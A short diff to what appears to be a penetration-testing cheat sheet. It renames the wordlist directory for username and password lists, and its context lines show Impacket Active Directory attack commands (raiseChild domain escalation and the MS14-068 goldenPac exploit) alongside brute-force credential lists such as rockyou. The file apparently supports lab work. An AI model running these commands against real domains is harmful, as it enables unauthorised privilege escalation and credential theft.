@@ -78,10 +78,10 @@ impacket-raiseChild -target-exec dc.<parent_domain> <domain>/<user>:<pass>
 # goldenPac: MS14-068 (legacy labs)
 impacket-goldenPac -dc-ip <ip> <domain>/<user>:<pass>
 
-; user/password lists live under $HOME/wordlists/SecLists
+; user/password lists live under $HOME/wordlists/seclists
 $ wordlist: printf '%s\n' \
-    "$HOME/wordlists/SecLists/Usernames/Names/names.txt" \
-    "$HOME/wordlists/SecLists/Usernames/top-usernames-shortlist.txt" \
-    "$HOME/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt" \
-    "$HOME/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" \
+    "$HOME/wordlists/seclists/Usernames/Names/names.txt" \
+    "$HOME/wordlists/seclists/Usernames/top-usernames-shortlist.txt" \
+    "$HOME/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt" \
+    "$HOME/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" \
     "/usr/share/wordlists/rockyou.txt"
